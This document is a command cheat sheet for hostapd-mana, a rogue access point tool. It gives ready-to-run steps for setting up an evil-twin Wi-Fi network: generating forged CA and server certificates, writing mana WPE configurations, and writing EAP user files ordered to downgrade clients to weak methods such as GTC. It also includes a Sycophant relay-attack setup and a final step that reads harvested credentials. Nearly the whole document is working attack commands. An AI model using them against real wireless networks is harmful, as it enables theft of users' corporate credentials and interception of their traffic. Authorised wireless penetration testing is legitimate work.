# hostapd-mana
% wifi, hostapd-mana, Access Point, rogue AP, evil-twin
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
rogue wifi access point tool. It can be used for a myriad of purposes from tracking and deanonymising devices (aka Snoopy), gathering corporate credentials from devices attempting EAP (aka WPE) or attracting as many devices as possible to connect to perform MitM attacks.
```

## _repo
```
https://github.com/sensepost/hostapd-mana
```

## _doc
```
https://github.com/sensepost/hostapd-mana/wiki
```

## _install
```
```

## Generate Diffie-Hellman parameters
```bash
openssl dhparam -out <ossl_dh_file|dh.pem> <ossl_dh_bits|2048>
```

## Generate CA (RSA)
```bash
openssl genrsa -out <ossl_ca_key_file|ca-key.pem> <ossl_ca_bits|2048> && openssl req -new -x509 -nodes -days <ossl_ca_cert_days|100> -key <ossl_ca_key_file|ca-key.pem> -out <ossl_ca_cert_file|ca.pem> -subj '/C=<ossl_srv_subj_C|US>/ST=<ossl_srv_subj_ST|California>/L=<ossl_srv_subj_L|San-Francisco>/O=<ossl_srv_subj_O|Jubeaz>/OU=<ossl_srv_subj_OU|IT-Department>/CN=<ossl_srv_subj_CN|JubeazCA>'
```

## Generate server (RSA)
```bash
echo -e '[ req ]\ndistinguished_name = dn\nattributes = att\nreq_extensions = ext\nprompt = no\n[ext]\nsubjectAltName = DNS:<ossl_srv_fqdn|jubeaz.com>\n[dn]\ncountryName = <ossl_srv_subj_C|US>\nstateOrProvinceName = <ossl_srv_subj_ST|California>\nlocalityName = <ossl_srv_subj_L|San-Francisco>\n0.organizationName = <ossl_srv_subj_O|Jubeaz>\norganizationalUnitName = <ossl_srv_subj_OU|IT-Department>\ncommonName = <ossl_srv_subj_CN|Jubeaz>\n[att]\nchallengePassword = <ossl_srv_challenge|challenge1234>' > <ossl_srv_cnf_file|server.cnf> && openssl req -newkey rsa:<ossl_srv_bits|2048> -nodes -keyout <ossl_srv_key_file|server-key.pem> -out <ossl_srv_csr_file|server.csr> -config <ossl_srv_cnf_file|server.cnf> && openssl x509 -req -days <ossl_srv_cert_days|100> -set_serial 01 -in <ossl_srv_csr_file|server.csr>  -out <ossl_srv_crt_file|server.pem>  -CA <ossl_ca_cert_file|ca.pem>  -CAkey <ossl_ca_key_file|ca-key.pem>
```

## create conf
```bash
echo -e '# Interface configuration \n interface=<wlan_interface|wlan0> \n ssid=<ssid> \n channel=<wlan_channel> \n auth_algs=3 \n wpa_key_mgmt=WPA-EAP \n wpa_pairwise=TKIP CCMP \n wpa=3 \n hw_mode=g \n ieee8021x=1 \n\n# EAP Configuration \n eap_server=1 \n eap_user_file=hostapd.eap_user\n eapol_key_index_workaround=0\n\n# Mana Configuration \n enable_mana=1 \n mana_loud=1 \n mana_credout=credentials.creds \n mana_eapsuccess=1 \n mana_wpe=1 \n\n# Certificate Configuration \n ca_cert=<ossl_ca_cert_file|ca.pem> \n server_cert=<ossl_srv_crt_file|server.pem> \n private_key=<ossl_srv_key_file|server-key.pem> \n dh_file=<ossl_dh_file|dh.pem>' > hostapd.conf
```

## create conf (relay attack)
```bash
echo -e '# Interface configuration \n interface=<wlan_interface|wlan0> \n ssid=<ssid> \n channel=<wlan_channel> \n auth_algs=3 \n wpa_key_mgmt=WPA-EAP \n wpa_pairwise=TKIP CCMP \n wpa=3 \n hw_mode=g \n ieee8021x=1 \n\n# EAP Configuration \n eap_server=1 \n eap_user_file=hostapd.eap_user\n eapol_key_index_workaround=0\n\n# Mana Configuration \n enable_mana=1 \n mana_loud=1 \n mana_credout=credentials.creds \n mana_eapsuccess=1 \n mana_wpe=1 \n\n# Certificate Configuration \n ca_cert=<ossl_ca_cert_file|ca.pem> \n server_cert=<ossl_srv_crt_file|server.pem> \n private_key=<ossl_srv_key_file|server-key.pem> \n dh_file=<ossl_dh_file|dh.pem>\n\n# # Sycophant Configuration \n enable_sycophant=1 \n sycophant_dir=/tmp/' > hostapd.conf
```

## create eap_user ()
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user
```

## create eap_user (Balanced)
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5 "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user
```

## create eap_user (GTC)
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" GTC "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user
```

## create eap_user (weakest to strongest)
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" GTC,TTLS-PAP,MD5,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,TTLS-MSCHAPV2,TTLS "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user
```

## create eap_user (strongest to weakest)
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,GTC,TTLS-PAP,TTLS-MSCHAP,MD5 "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user
```

## create eap_user (relay attack)
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t"TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP   "challenge1234"[2]' > hostapd.eap_user
```


## launch
```bash
sudo hostapd-mana hostapd.conf
```

## harvest
```bash
cat credentials.creds 
```